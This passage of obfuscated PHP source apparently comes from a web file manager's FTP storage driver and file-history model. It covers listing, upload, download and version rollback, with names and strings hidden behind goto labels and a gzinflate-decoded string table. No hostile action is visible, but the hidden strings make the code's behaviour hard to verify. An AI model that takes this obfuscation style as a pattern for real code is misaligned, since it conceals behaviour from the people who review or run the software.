D‘•‚¯¿: } private function folderInfo($aÜîÙğäŞ’, $FÏ´¼Ö„á = false) { $CÊôÉ¢ˆ¨• =& $_SERVER[Ïº«‚ßèÔˆø]; $bÍíÄ«ö = array($CÊôÉ¢ˆ¨•[28] => $this->pathThis($aÜîÙğäŞ’), $CÊôÉ¢ˆ¨•[76] => $this->getPathOuter($CÊôÉ¢ˆ¨•[8] . $aÜîÙğäŞ’), $CÊôÉ¢ˆ¨•[29] => $CÊôÉ¢ˆ¨•[77]); if ($FÏ´¼Ö„á) { return $bÍíÄ«ö; } $bÍíÄ«ö[$CÊôÉ¢ˆ¨•[193]] = $bÍíÄ«ö[$CÊôÉ¢ˆ¨•[84]] = 0; $bÍíÄ«ö[$CÊôÉ¢ˆ¨•[194]] = $bÍíÄ«ö[$CÊôÉ¢ˆ¨•[195]] = !0; return $bÍíÄ«ö; } private function fileInfo($F¨­¾çÇÓÓ, $C—®ì§ºæ = false, $e¢¿ƒºÎ¥Î = array()) { goto dÑîô«àÃÈ; fí½øÌÏÙ¨: $CÆ¾ñÔàˆƒ[$e¦™Òñ²¤[84]] = @ftp_mdtm($this->connect, $FòÙÜ½«); if (empty($e¢¿ƒºÎ¥Î)) { $e¢¿ƒºÎ¥Î = $this->objectMeta($F¨­¾çÇÓÓ); if (!$e¢¿ƒºÎ¥Î) { return $CÆ¾ñÔàˆƒ; } } $CÆ¾ñÔàˆƒ[$e¦™Òñ²¤[78]] = $e¢¿ƒºÎ¥Î[$e¦™Òñ²¤[78]]; goto aÇäÃ¶÷„Ò; bï‘²ÃíÃÂ: $CÆ¾ñÔàˆƒ[$e¦™Òñ²¤[193]] = $CÆ¾ñÔàˆƒ[$e¦™Òñ²¤[84]] = 0; $CÆ¾ñÔàˆƒ[$e¦™Òñ²¤[194]] = $CÆ¾ñÔàˆƒ[$e¦™Òñ²¤[195]] = !0; $FòÙÜ½« = $this->iconvSystem($F¨­¾çÇÓÓ); goto fí½øÌÏÙ¨; aÇäÃ¶÷„Ò: return $CÆ¾ñÔàˆƒ; goto DøÛàÈá; dÑîô«àÃÈ: $e¦™Òñ²¤ =& $_SERVER[Ïº«‚ßèÔˆø]; $CÆ¾ñÔàˆƒ = array($e¦™Òñ²¤[28] => $this->pathThis($F¨­¾çÇÓÓ), $e¦™Òñ²¤[76] => $this->getPathOuter($e¦™Òñ²¤[8] . $F¨­¾çÇÓÓ), $e¦™Òñ²¤[29] => $e¦™Òñ²¤[192], $e¦™Òñ²¤[78] => isset($e¢¿ƒºÎ¥Î[$e¦™Òñ²¤[78]]) ? $e¢¿ƒºÎ¥Î[$e¦™Òñ²¤[78]] : 0, $e¦™Òñ²¤[168] => $this->ext($F¨­¾çÇÓÓ)); if ($C—®ì§ºæ) { return $CÆ¾ñÔàˆƒ; } goto bï‘²ÃíÃÂ; DøÛàÈá: } public function size($Fà¯ØãØ÷Š) { $d¨“óöÉ = $this->objectMeta($Fà¯ØãØ÷Š); return $d¨“óöÉ ? $d¨“óöÉ[$_SERVER[Ïº«‚ßèÔˆø][78]] : 0; } public function info($fœµä†ô„) { if ($this->isFile($fœµä†ô„)) { return $this->fileInfo($fœµä†ô„, 0); } else { if ($this->isFolder($fœµä†ô„)) { return $this->folderInfo($fœµä†ô„); } } return !1; } private function fileList($Dï¡¾æõí, &$fã™Ş½Ö‡, &$f¹„‡øÕ®, $CáöÏÍ²Ë¥ = false) { goto A…Ùò‚â³“; b´‘Â›ğ¨¬: @ftp_chdir($this->connect, $E¡Œó†¶˜[8]); $Dï¡¾æõí = rtrim($Dï¡¾æõí, $E¡Œó†¶˜[8]) . $E¡Œó†¶˜[8]; check_abort(); goto cÖ»º‡ÉÌ; A…Ùò‚â³“: $E¡Œó†¶˜ =& $_SERVER[Ïº«‚ßèÔˆø]; $Dï¡¾æõí = $this->iconvSystem($Dï¡¾æõí); if (!$this->isFolder($Dï¡¾æõí)) { return !1; } goto b´‘Â›ğ¨¬; cÖ»º‡ÉÌ: $bœÎÇ‰áœ‚ = $this->listItemCache === !1 ? !1 : !0; $Cô®òÔ‹½ = @ftp_rawlist($this->connect, $Dï¡¾æõí); if (!$Cô®òÔ‹½) { $Cô®òÔ‹½ = array(); } goto d®³Úõ‡ØÙ; d®³Úõ‡ØÙ: $B±Íº” ÅÎ = array($E¡Œó†¶˜[95] => 1, $E¡Œó†¶˜[1233] => 1); foreach ($Cô®òÔ‹½ as $aÃ–éË‘òí) { goto F¹¼Üµ¼´¤; f¤¢ŸÑ¿òß: if (substr($aÃ–éË‘òí, 0, 1) == $E¡Œó†¶˜[1234]) { $f­‘‘ìçĞÛ[$E¡Œó†¶˜[29]] = $E¡Œó†¶˜[77]; $f­‘‘ìçĞÛ[$E¡Œó†¶˜[78]] = 0; } $DË´ªî¼¸ = $f­‘‘ìçĞÛ[$E¡Œó†¶˜[29]] == $E¡Œó†¶˜[77] ? !0 : !1; if ($bœÎÇ‰áœ‚) { $this->cacheMethod($E¡Œó†¶˜[198], $dÇÅ×¡¸œÏ, $DË´ªî¼¸); $this->cacheMethod($E¡Œó†¶˜[199], $dÇÅ×¡¸œÏ, $f­‘‘ìçĞÛ); } goto ağ¥†´ï”; DÓ÷Œâ—¥: if (!$dÇÅ×¡¸œÏ || isset($B±Íº” ÅÎ[$dÇÅ×¡¸œÏ])) { continue; } $dÇÅ×¡¸œÏ = $this->iconvApp($Dï¡¾æõí . ltrim($dÇÅ×¡¸œÏ, $E¡Œó†¶˜[8])); $f­‘‘ìçĞÛ = array($E¡Œó†¶˜[28] => $dÇÅ×¡¸œÏ, $E¡Œó†¶˜[29] => $E¡Œó†¶˜[192], $E¡Œó†¶˜[78] => $bÁ÷Áè“÷[4]); goto f¤¢ŸÑ¿òß; F¹¼Üµ¼´¤: $bÁ÷Áè“÷ = $this->_listItem($aÃ–éË‘òí); if ($bÁ÷Áè“÷[0] == $E¡Œó†¶˜[703]) { continue; } $dÇÅ×¡¸œÏ = $bÁ÷Áè“÷[8]; goto DÓ÷Œâ—¥; ağ¥†´ï”: if ($DË´ªî¼¸) { $fã™Ş½Ö‡[] = $dÇÅ×¡¸œÏ; if ($CáöÏÍ²Ë¥) { $this->fileList($dÇÅ×¡¸œÏ, $fã™Ş½Ö‡, $f¹„‡øÕ®, $CáöÏÍ²Ë¥); } continue; } $f¹„‡øÕ®[] = $f­‘‘ìçĞÛ; goto FŠÆåŒí; FŠÆåŒí: } if ($bœÎÇ‰áœ‚) { $this->cacheMethod($E¡Œó†¶˜[198], $Dï¡¾æõí, !0); } goto d°Ÿ†‰Ÿ¨ñ; d°Ÿ†‰Ÿ¨ñ: } private function _listItem($DóÕØß®ˆ) { if (empty($DóÕØß®ˆ)) { return array(); } $e–œàï³•Ñ = preg_split($_SERVER[Ïº«‚ßèÔˆø][1235], $DóÕØß®ˆ); if (count($e–œàï³•Ñ) <= 9) { return $e–œàï³•Ñ; } $e–œàï³•Ñ[8] = trim(substr($DóÕØß®ˆ, strpos($DóÕØß®ˆ, $e–œàï³•Ñ[7]) + strlen($e–œàï³•Ñ[7]))); return array_splice($e–œàï³•Ñ, 0, 9); } public function listPath($c’ùó…êÔ, $Båäù¨³±ó = false) { goto BÀŒ¿Á”; d‡‹Ö™£ìŠ: return array($dš±Ï£‡›¨[75] => $D‚òœÈîÛ, $dš±Ï£‡›¨[74] => $CÛç›‰É®); goto b¢ÛÂè‰ß; BÀŒ¿Á”: $dš±Ï£‡›¨ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$this->_isconn()) { return !1; } $D‚òœÈîÛ = $CÛç›‰É® = array(); goto D£¶æÀÇ°ç; D£¶æÀÇ°ç: $this->fileList($c’ùó…êÔ, $D‚òœÈîÛ, $CÛç›‰É®); foreach ($D‚òœÈîÛ as $A“ÊğªÖÊ­ => $d¿ª˜òçî) { $D‚òœÈîÛ[$A“ÊğªÖÊ­] = $this->folderInfo($d¿ª˜òçî, $Båäù¨³±ó); } foreach ($CÛç›‰É® as $A“ÊğªÖÊ­ => $d¿ª˜òçî) { $CÛç›‰É®[$A“ÊğªÖÊ­] = $this->fileInfo($d¿ª˜òçî[$dš±Ï£‡›¨[28]], $Båäù¨³±ó, $d¿ª˜òçî); } goto d‡‹Ö™£ìŠ; b¢ÛÂè‰ß: } public function has($aãŠÄÅöŞ×, $CÕª›³… = false, $e”¤ŠŒ‡ËÅ = true) { goto F¦•à½ŒÙ; Aî¡—á¶Š¿: return !1; goto b›ÊÔâó; c³°®Ÿ‡À: $this->fileList($aãŠÄÅöŞ×, $CË±‘–¬òí, $A’ÙœÊÁÃª, $c´×Ú¨Ë³); if ($CÕª›³…) { return array($cñë•ò·¢£[202] => count($A’ÙœÊÁÃª), $cñë•ò·¢£[203] => count($CË±‘–¬òí)); } if ($e”¤ŠŒ‡ËÅ) { if (count($A’ÙœÊÁÃª)) { return !0; } } else { if (count($CË±‘–¬òí)) { return !0; } } goto Aî¡—á¶Š¿; F¦•à½ŒÙ: $cñë•ò·¢£ =& $_SERVER[Ïº«‚ßèÔˆø]; $CË±‘–¬òí = $A’ÙœÊÁÃª = array(); $c´×Ú¨Ë³ = $CÕª›³… ? !0 : !1; goto c³°®Ÿ‡À; b›ÊÔâó: } public function listAll($C¦İŠ·‚) { goto dä²ò‹´„; EÉãÑê–œ¡: foreach ($C¿åÏœáĞé as $BÁªåÜ¸ëå) { if (is_string($BÁªåÜ¸ëå)) { $FÏƒŞ¿¥„‹[$BÁªåÜ¸ëå] = 0; } } return $this->listAllFiles($C¦İŠ·‚, array_keys($FÏƒŞ¿¥„‹), $FÏƒŞ¿¥„‹); goto a«¹¿¹”†; C¸Ì«î…Ö¿: $this->fileList($C¦İŠ·‚, $C¿åÏœáĞé, $aÇÚ•µ©, !0); $FÏƒŞ¿¥„‹ = array(); foreach ($aÇÚ•µ© as $BÁªåÜ¸ëå) { $FÏƒŞ¿¥„‹[$BÁªåÜ¸ëå[$Cİ ÑÉØªë[28]]] = $BÁªåÜ¸ëå[$Cİ ÑÉØªë[78]]; } goto EÉãÑê–œ¡; dä²ò‹´„: $Cİ ÑÉØªë =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$this->_isconn()) { return !1; } $C¿åÏœáĞé = $aÇÚ•µ© = array(); goto C¸Ì«î…Ö¿; a«¹¿¹”†: } public function getContent($föÒ½—Ä™ø) { if (!$this->_isconn()) { return !1; } $föÒ½—Ä™ø = $this->iconvSystem($föÒ½—Ä™ø); return $this->fileSubstr($föÒ½—Ä™ø); } public function setContent($DƒÑÔâÈ£, $bµÜ“İ¬©å = '') { goto e™ˆµ«´êê; a˜ª°Úâ¢å: return $CèÌ’¼õ†Œ; goto AÚä¾©‹Ó; D×°à´“Š: file_put_contents($A¢™ªçôÎ, $bµÜ“İ¬©å); $CèÌ’¼õ†Œ = $this->upload($DƒÑÔâÈ£, $this->iconvApp($A¢™ªçôÎ)); $this->tempFileRemve($A¢™ªçôÎ); goto a˜ª°Úâ¢å; e™ˆµ«´êê: if (!$this->_isconn()) { return !1; } $Bª÷ƒíéÊÃ = $this->pathThis($this->iconvSystem($DƒÑÔâÈ£)); $A¢™ªçôÎ = $this->tempFile($Bª÷ƒíéÊÃ); goto D×°à´“Š; AÚä¾©‹Ó: } public function fileSubstr($AÔÆà°‘›º, $D×êôÏÚºÙ = 0, $BˆâØ÷™œ¸ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($AÔÆà°‘›º, $D×êôÏÚºÙ, $BˆâØ÷™œ¸); } private function ftpRequest($dõ—‘†åæ, $AÎİ‹²™¼‹ = 0, $aˆñÌ³Çã = false) { goto B“•Ë¬”ƒ; c¹Æ ‘à: return $BƒàíèÎ; goto FÀ˜Ù•óß‹; aâæÛÓ‡Ä: curl_setopt($B±­Ø¾‘îØ, CURLOPT_RETURNTRANSFER, 1); $BƒàíèÎ = curl_exec($B±­Ø¾‘îØ); curl_close($B±­Ø¾‘îØ); goto c¹Æ ‘à; Bö™‹¿²ÙÇ: curl_setopt($B±­Ø¾‘îØ, CURLOPT_URL, $a« ëÎáóß . $this->pathEncode($dõ—‘†åæ)); curl_setopt($B±­Ø¾‘îØ, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($aˆñÌ³Çã) { $aÍÆå¼”ë = $AÎİ‹²™¼‹ + $aˆñÌ³Çã - 1; curl_setopt($B±­Ø¾‘îØ, CURLOPT_RANGE, "{$AÎİ‹²™¼‹}\55{$aÍÆå¼”ë}"); } goto aâæÛÓ‡Ä; B“•Ë¬”ƒ: $dõ—‘†åæ = $this->iconvSystem($dõ—‘†åæ); $a« ëÎáóß = $this->scheme . $this->host . $_SERVER[Ïº«‚ßèÔˆø][4] . $this->port; $B±­Ø¾‘îØ = curl_init(); goto Bö™‹¿²ÙÇ; FÀ˜Ù•óß‹: } public function upload($FÛ…–…ÑÌ», $EÃ…“Ñ»Õ, $CÅÂ¸ºÍáÅ = false, $A‹èµŠ¯£› = REPEAT_REPLACE) { goto f£…¹Ÿ¼¨í; f£…¹Ÿ¼¨í: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($FÛ…–…ÑÌ»))) { return !1; } $FÛ…–…ÑÌ» = $this->iconvSystem($FÛ…–…ÑÌ»); goto d’›ÜĞ°†Å; d«„Ö‰æ: if ($EÛ«ªâÙµç != FTP_FINISHED) { return !1; } return $this->getPathOuter($FÛ…–…ÑÌ»); goto c‡…Ú¶Ñ‚; d’›ÜĞ°†Å: $EÃ…“Ñ»Õ = $this->iconvSystem($EÃ…“Ñ»Õ); $EÛ«ªâÙµç = ftp_nb_put($this->connect, $FÛ…–…ÑÌ», $EÃ…“Ñ»Õ, FTP_BINARY); while ($EÛ«ªâÙµç == FTP_MOREDATA) { $EÛ«ªâÙµç = ftp_nb_continue($this->connect); } goto d«„Ö‰æ; c‡…Ú¶Ñ‚: } public function download($AÈ¿ˆÄÒ, $bâ‚Ü¶à¾ = '') { goto fÌ²Òçƒ; fÌ²Òçƒ: if (!$this->_isconn()) { return !1; } $CÛœŞ¿éÕñ = $this->pathFather($bâ‚Ü¶à¾); if (!IO::mkdir($CÛœŞ¿éÕñ)) { return !1; } goto EƒØà¯êÖ; EƒØà¯êÖ: $AÈ¿ˆÄÒ = $this->iconvSystem($AÈ¿ˆÄÒ); $bâ‚Ü¶à¾ = $this->iconvSystem($bâ‚Ü¶à¾); $Eô®»“… = ftp_nb_get($this->connect, $bâ‚Ü¶à¾, $AÈ¿ˆÄÒ, FTP_BINARY); goto Bš™õ¨Ê­; Bš™õ¨Ê­: while ($Eô®»“… == FTP_MOREDATA) { $Eô®»“… = ftp_nb_continue($this->connect); } if ($Eô®»“… != FTP_FINISHED) { return !1; } return $this->iconvApp($bâ‚Ü¶à¾); goto eêµó¢‡¬; eêµó¢‡¬: } public function exist($f¶¥Áà â¯) { return $this->isFile($f¶¥Áà â¯) || $this->isFolder($f¶¥Áà â¯); } public function isFile($f‰¯‰–‚¯) { return !$this->isFolder($f‰¯‰–‚¯) && $this->objectMeta($f‰¯‰–‚¯); } public function isFolder($C¡åğŸŞƒÖ) { return $this->cacheMethod($_SERVER[Ïº«‚ßèÔˆø][198], $C¡åğŸŞƒÖ); } protected function objectMeta($f‹Ñ«“¨¾¢) { return $this->cacheMethod($_SERVER[Ïº«‚ßèÔˆø][199], $f‹Ñ«“¨¾¢); } protected function _objectMeta($DœùñæÓ‰ğ) { goto F’¬Ô„œÏÔ; d¯İ º’ÆŞ: $DŞµâøÂ = @ftp_size($this->connect, $DœùñæÓ‰ğ); if ($DŞµâøÂ != -1) { $c—›ğæâ·—[$E¢­ÍŸÄÏù[78]] = $DŞµâøÂ; } else { $däŠ©­ÚÕ = @ftp_chdir($this->connect, $DœùñæÓ‰ğ); if (!$däŠ©­ÚÕ) { return !1; } $c—›ğæâ·—[$E¢­ÍŸÄÏù[29]] = $E¢­ÍŸÄÏù[77]; } return $c—›ğæâ·—; goto Fè×ÃÈãÜã; c´¹‘ÂºÇ‰: $DœùñæÓ‰ğ = $this->iconvSystem($DœùñæÓ‰ğ); $c—›ğæâ·— = array($E¢­ÍŸÄÏù[28] => $this->iconvApp($DœùñæÓ‰ğ), $E¢­ÍŸÄÏù[29] => $E¢­ÍŸÄÏù[192], $E¢­ÍŸÄÏù[78] => 0); @ftp_chdir($this->connect, $E¢­ÍŸÄÏù[8]); goto d¯İ º’ÆŞ; F’¬Ô„œÏÔ: $E¢­ÍŸÄÏù =& $_SERVER[Ïº«‚ßèÔˆø]; if ($DœùñæÓ‰ğ == $E¢­ÍŸÄÏù[33] || $DœùñæÓ‰ğ == $E¢­ÍŸÄÏù[8]) { return array(); } if (!$this->_isconn()) { return !1; } goto c´¹‘ÂºÇ‰; Fè×ÃÈãÜã: } protected function _isFolder($fØèÉ”Ï™—) { $f¼ƒÊ‡”ÔÂ =& $_SERVER[Ïº«‚ßèÔˆø]; if ($fØèÉ”Ï™— == $f¼ƒÊ‡”ÔÂ[33] || $fØèÉ”Ï™— == $f¼ƒÊ‡”ÔÂ[8]) { return !0; } $Fƒà‘‚ğî¨ = $this->_objectMeta($fØèÉ”Ï™—); return isset($Fƒà‘‚ğî¨[$f¼ƒÊ‡”ÔÂ[29]]) && $Fƒà‘‚ğî¨[$f¼ƒÊ‡”ÔÂ[29]] == $f¼ƒÊ‡”ÔÂ[77] ? !0 : !1; } } goto C¿ ¤É•šº; B¡Ö­‘Í¶: define($_SERVER[Ïº«‚ßèÔˆø][0], $_SERVER[Ïº«‚ßèÔˆø][1]); $_SERVER[»ã] = explode($_SERVER[Ïº«‚ßèÔˆø][2], gzinflate(substr($_SERVER[Ïº«‚ßèÔˆø][3], 10, -8))); function binCheckEq($c‡Š³ó¥‚†, $CåÓ«â‹Ò­) { return $c‡Š³ó¥‚† == $CåÓ«â‹Ò­; } goto e´¶ÛËµ•; eÉñ×±ôëÌ: $dÉœõİš›Œ = $_SERVER[Ïº«‚ßèÔˆø][573]; if (!$dÉœõİš›Œ) { return; } $_SERVER[£ñ­Åö°¿] = explode($_SERVER[Ïº«‚ßèÔˆø][574], gzinflate(substr($_SERVER[Ïº«‚ßèÔˆø][575], 10, -8))); goto B¤ôŸÒÂ¼‚; cƒ“ èË¿: class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\157\x75\162\143\x65\137\x68\151\163\x74\x6f\162\x79"; public function historyCount($Cã¿Ã˜­Ó) { goto d¢øÆ‘‹Ÿô; d¾®’Â§îİ: return array_to_keyvalue($c¢¼‚—çŠ¯, $eåñ÷¦Ç¸’[394], $eåñ÷¦Ç¸’[478]); goto bÙê§Â–´ø; d¢øÆ‘‹Ÿô: $eåñ÷¦Ç¸’ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$Cã¿Ã˜­Ó) { return array(); } if (is_string($Cã¿Ã˜­Ó) || is_int($Cã¿Ã˜­Ó)) { $Cã¿Ã˜­Ó = array($Cã¿Ã˜­Ó); } goto Bº±›õêº¿; Bº±›õêº¿: $B¹ÌÚÑÈğ = array($eåñ÷¦Ç¸’[394], $eåñ÷¦Ç¸’[1703] => $eåñ÷¦Ç¸’[478]); $AÜ¨İîŒ–‚ = array($eåñ÷¦Ç¸’[394] => array($eåñ÷¦Ç¸’[7], $Cã¿Ã˜­Ó)); $c¢¼‚—çŠ¯ = $this->field($B¹ÌÚÑÈğ)->where($AÜ¨İîŒ–‚)->group($eåñ÷¦Ç¸’[394])->select(); goto d¾®’Â§îİ; bÙê§Â–´ø: } public function addHistory($FµÑ”˜å”à, $A¢é¨ªŒêÃ = '') { $cÈö˜ËÓ»Î =& $_SERVER[Ïº«‚ßèÔˆø]; $fèçà¾í“Š = array($cÈö˜ËÓ»Î[408] => $FµÑ”˜å”à[$cÈö˜ËÓ»Î[394]], $cÈö˜ËÓ»Î[1500] => isset($FµÑ”˜å”à[$cÈö˜ËÓ»Î[432]]) ? $FµÑ”˜å”à[$cÈö˜ËÓ»Î[432]] : $FµÑ”˜å”à[$cÈö˜ËÓ»Î[430]], $cÈö˜ËÓ»Î[446] => $FµÑ”˜å”à[$cÈö˜ËÓ»Î[445]], $cÈö˜ËÓ»Î[547] => $FµÑ”˜å”à[$cÈö˜ËÓ»Î[78]], $cÈö˜ËÓ»Î[1899] => $A¢é¨ªŒêÃ); $f†É‘Óõ…Ã = $GLOBALS[$cÈö˜ËÓ»Î[6]][$cÈö˜ËÓ»Î[88]][$cÈö˜ËÓ»Î[1087]]; if ($f†É‘Óõ…Ã > 1) { $this->historyAutoClear($fèçà¾í“Š[$cÈö˜ËÓ»Î[394]]); $this->add($fèçà¾í“Š); } Hook::trigger($cÈö˜ËÓ»Î[1900], $fèçà¾í“Š); Model($cÈö˜ËÓ»Î[1901])->eventFileEdit($FµÑ”˜å”à[$cÈö˜ËÓ»Î[394]]); } private function historyAutoClear($A³¯®Äç‡) { goto B‡ùŒ‡İ×ñ; eìà‘ò§ö: $FŠ£†˜ØÛ = $b„òî©•‘ == $aÖõ¦öµ[1109] ? 5 : $AÀİôÚøË; if ($AÀİôÚøË <= 1) { $FŠ£†˜ØÛ = 1; } if ($FŠ£†˜ØÛ >= 500) { return; } goto bëã˜éÅ„; AàŠ×š§í„: $bšº¡ÄøÔ¢ = array_to_keyvalue($cÌÖ«‘ò“, $aÖõ¦öµ[33], $aÖõ¦öµ[392]); $bšº¡ÄøÔ¢ = array_slice($bšº¡ÄøÔ¢, $FŠ£†˜ØÛ); $d‹Ÿ»å¸õ† = array_to_keyvalue($cÌÖ«‘ò“, $aÖõ¦öµ[33], $aÖõ¦öµ[445]); goto cÜ˜š¹—£ê; BãŠºÏ¸×Á: $this->where($cÉØ¨ŠÛ§©)->delete(); Model($aÖõ¦öµ[448])->remove($d‹Ÿ»å¸õ†); goto bÈ³¸å—ˆÇ; bëã˜éÅ„: $cÉØ¨ŠÛ§© = array($aÖõ¦öµ[408] => $A³¯®Äç‡); $cÌÖ«‘ò“ = $this->field($aÖõ¦öµ[1902])->where($cÉØ¨ŠÛ§©)->order($aÖõ¦öµ[1896])->select(); if (!$cÌÖ«‘ò“ || $FŠ£†˜ØÛ >= count($cÌÖ«‘ò“)) { return; } goto AàŠ×š§í„; cÜ˜š¹—£ê: $d‹Ÿ»å¸õ† = array_slice($d‹Ÿ»å¸õ†, $FŠ£†˜ØÛ); if (!$bšº¡ÄøÔ¢ || !$d‹Ÿ»å¸õ†) { return; } $cÉØ¨ŠÛ§© = array($aÖõ¦öµ[410] => array($aÖõ¦öµ[7], $bšº¡ÄøÔ¢)); goto BãŠºÏ¸×Á; B‡ùŒ‡İ×ñ: $aÖõ¦öµ =& $_SERVER[Ïº«‚ßèÔˆø]; $b„òî©•‘ = Model($aÖõ¦öµ[714])->get($aÖõ¦öµ[1108]); $AÀİôÚøË = $GLOBALS[$aÖõ¦öµ[6]][$aÖõ¦öµ[88]][$aÖõ¦öµ[1087]]; goto eìà‘ò§ö; bÈ³¸å—ˆÇ: } public function listData($b†µÊ—ã) { goto B÷‚ˆçØ£; cŸÀ»«ÈÄˆ: $B¥Ì¥·Š— = 5; if ($Fğê÷Æ‰ ‡ == $fŒñæó„‘è[1109]) { $fµ‘ˆÖ‘äœ[$fŒñæó„‘è[366]] = array_slice($fµ‘ˆÖ‘äœ[$fŒñæó„‘è[366]], 0, $B¥Ì¥·Š—); $fµ‘ˆÖ‘äœ[$fŒñæó„‘è[363]] = array($fŒñæó„‘è[1904] => 1, $fŒñæó„‘è[1905] => 20, $fŒñæó„‘è[1906] => 1, $fŒñæó„‘è[1907] => count($fµ‘ˆÖ‘äœ[$fŒñæó„‘è[366]])); } return $fµ‘ˆÖ‘äœ; goto D©Í¨Ô‚ˆ; c·ù¶åÚ‘: $fµ‘ˆÖ‘äœ = $this->field($E’‡Ï›Ï¾Ç)->where($aé‹¤æ…Œ)->order($fŒñæó„‘è[1896])->selectPage(); $this->_listAppendUser($fµ‘ˆÖ‘äœ[$fŒñæó„‘è[366]]); $Fğê÷Æ‰ ‡ = Model($fŒñæó„‘è[714])->get($fŒñæó„‘è[1108]); goto cŸÀ»«ÈÄˆ; B÷‚ˆçØ£: $fŒñæó„‘è =& $_SERVER[Ïº«‚ßèÔˆø]; $aé‹¤æ…Œ = array($fŒñæó„‘è[408] => $b†µÊ—ã); $E’‡Ï›Ï¾Ç = $fŒñæó„‘è[1903]; goto c·ù¶åÚ‘; D©Í¨Ô‚ˆ: } protected function _listAppendUser(&$dİñ ÃÒã) { $b“ßƒ’¿ÕŞ =& $_SERVER[Ïº«‚ßèÔˆø]; $d¥øçòÈ…ß = array_to_keyvalue($dİñ ÃÒã, $b“ßƒ’¿ÕŞ[33], $b“ßƒ’¿ÕŞ[1508]); $a°¥éË„‚Í = Model($b“ßƒ’¿ÕŞ[505])->userListInfo($d¥øçòÈ…ß); foreach ($dİñ ÃÒã as &$eä¶ÕØçÍ„) { $EƒİŒ‰ÏäÖ = $eä¶ÕØçÍ„[$b“ßƒ’¿ÕŞ[1508]]; $eä¶ÕØçÍ„[$b“ßƒ’¿ÕŞ[430]] = $a°¥éË„‚Í[$EƒİŒ‰ÏäÖ] ? $a°¥éË„‚Í[$EƒİŒ‰ÏäÖ] : !1; } unset($eä¶ÕØçÍ„); } public function fileInfo($F¸™¸Ù¾¿) { $eÓáàê¨×¶ =& $_SERVER[Ïº«‚ßèÔˆø]; $B¹ÅÃ³øÚÜ = $this->tablePrefix; $aÈ‰†“¸¶ = "{$B¹ÅÃ³øÚÜ}\151\x6f\x5f\146\x69\x6c\145\40\x66\x69\154\145\163\x20\x6f\x6e\40\146\x69\154\x65\163\56\x66\x69\154\x65\x49\x44\40\75\40\150\x69\x73\164\157\x72\x79\x2e\146\x69\x6c\x65\111\x44"; return $this->alias($eÓáàê¨×¶[1908])->where(array($eÓáàê¨×¶[410] => $F¸™¸Ù¾¿))->join($aÈ‰†“¸¶, $eÓáàê¨×¶[1909])->find(); } public function removeItem($bÁÄŠŠÁ‡•) { $eÎ’Õ›ˆÙÙ =& $_SERVER[Ïº«‚ßèÔˆø]; $b²¹Ğ¯³×ƒ = array($eÎ’Õ›ˆÙÙ[410] => $bÁÄŠŠÁ‡•); $a¨§ƒ×åº = $this->where($b²¹Ğ¯³×ƒ)->find(); if ($a¨§ƒ×åº) { $F¬Ï¶ø¸Ô = $this->where($b²¹Ğ¯³×ƒ)->delete(); Model($eÎ’Õ›ˆÙÙ[448])->remove($a¨§ƒ×åº[$eÎ’Õ›ˆÙÙ[445]]); return $F¬Ï¶ø¸Ô; } return !1; } public function removeBySource($a¹ŒçóÄ) { goto cšœóÊóÚ‚; FÂŸˆ‘ä‡Ô: $fİ­É½…ÆÑ = array($FÅÚ¹îùŒ§[408] => array($FÅÚ¹îùŒ§[7], $a¹ŒçóÄ)); $C¤ëªå‡‰ = $this->field($FÅÚ¹îùŒ§[446])->where($fİ­É½…ÆÑ)->select(); if ($C¤ëªå‡‰) { $this->where($fİ­É½…ÆÑ)->delete(); $Cò¹İšØ× = array_to_keyvalue($C¤ëªå‡‰, $FÅÚ¹îùŒ§[33], $FÅÚ¹îùŒ§[445]); Model($FÅÚ¹îùŒ§[448])->remove($Cò¹İšØ×); } goto d‡»Ñ¦ƒù; cšœóÊóÚ‚: $FÅÚ¹îùŒ§ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$a¹ŒçóÄ) { return !1; } if (!is_array($a¹ŒçóÄ)) { $a¹ŒçóÄ = array($a¹ŒçóÄ); } goto FÂŸˆ‘ä‡Ô; d‡»Ñ¦ƒù: return !0; goto f¢¶‚¼Å£; f¢¶‚¼Å£: } public function setDetail($e‡øæøËù, $AœšÆ²Ÿª) { $D´¯ÏŒ…Ò¯ =& $_SERVER[Ïº«‚ßèÔˆø]; return $this->where(array($D´¯ÏŒ…Ò¯[410] => $e‡øæøËù))->save(array($D´¯ÏŒ…Ò¯[1899] => $AœšÆ²Ÿª)); } public function rollbackToItem($E…ƒ×…Íİæ, $aÃÄ®ãÆ…‹) { goto b°ğÅäµø¹; E•À“¬äóí: return $this->where(array($d™°œÇÊë¡[410] => $aÃÄ®ãÆ…‹))->delete(); goto Aî‰ßêªØà; b°ğÅäµø¹: $d™°œÇÊë¡ =& $_SERVER[Ïº«‚ßèÔˆø]; $b½ä·Ó‡¬ï = Model($d™°œÇÊë¡[782])->sourceInfo($E…ƒ×…Íİæ); $this->addHistory($b½ä·Ó‡¬ï, LNG($d™°œÇÊë¡[1910])); goto aœ™¿ºÈÁ…; aœ™¿ºÈÁ…: $EËçŠİë¨ç = $this->find($aÃÄ®ãÆ…‹); $Cïé®“”Ú = array($d™°œÇÊë¡[445] => $EËçŠİë¨ç[$d™°œÇÊë¡[445]], $d™°œÇÊë¡[78] => $EËçŠİë¨ç[$d™°œÇÊë¡[78]], $d™°œÇÊë¡[84] => time(), $d™°œÇÊë¡[432] => USER_ID); Model($d™°œÇÊë¡[782])->where(array($d™°œÇÊë¡[394] => $E…ƒ×…Íİæ))->save($Cïé®“”Ú); goto E•À“¬äóí; Aî‰ßêªØà: } public function clearSame($a‘ãÆôå±è) { goto A®¤•¿´; cšãœ”©Åñ: if (!$fäÇÎ‡ÃÙŠ) { return; } $this->where(array($f‡ğ«‹¦Òº[392] => array($f‡ğ«‹¦Òº[7], $fäÇÎ‡ÃÙŠ)))->delete(); Model($f‡ğ«‹¦Òº[448])->remove($F÷‡±›“šç); goto dÓ¡ÜçÅ¶; A®¤•¿´: $f‡ğ«‹¦Òº =& $_SERVER[Ïº«‚ßèÔˆø]; $f‘ğ¶¶ï‡“ = $this->listData($a‘ãÆôå±è); $Càˆò¶øê = array_to_keyvalue_group($f‘ğ¶¶ï‡“, $f‡ğ«‹¦Òº[445]); goto C¢ÒŞ˜á§é; 